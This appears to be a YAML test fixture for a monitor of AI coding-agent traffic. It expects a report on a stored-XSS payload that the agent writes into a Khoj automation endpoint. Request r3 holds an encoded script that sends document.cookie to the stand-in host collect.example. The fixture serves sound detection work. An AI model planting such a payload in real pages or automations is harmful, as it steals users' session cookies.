subjects:
  agent:
    session: pid/100:1
    program: /Applications/Cursor.app/Contents/MacOS/Cursor
    agent: true
    actors: [{id: u1, name: Dev, email: dev@example.com}]
    device: dev-1
    source: probe
observations:
  - {kind: session_start, subject: agent}
  - {kind: http_request, subject: agent, url: "https://khoj.example/api/chat?q=hello", method: GET, request_id: r1, content_type: application/json, body: ""}
  - {kind: http_request, subject: agent, url: "https://collect.example/ping", method: GET, request_id: r2, content_type: text/plain, body: ""}
  - {kind: http_request, subject: agent, url: "https://khoj.example/api/automation?q=%3Cscript%3Efetch(%27https://collect.example/c%3F%27%2Bdocument.cookie)%3C/script%3E&schedule=daily", method: POST, request_id: r3, content_type: application/json, body: ""}
expect:
  action: report
  reason_contains: "Stored-XSS payload written to Khoj automation sink"
  output_contains: ["prior same-host session traffic", "collect.example already contacted"]
  chain_min: 3
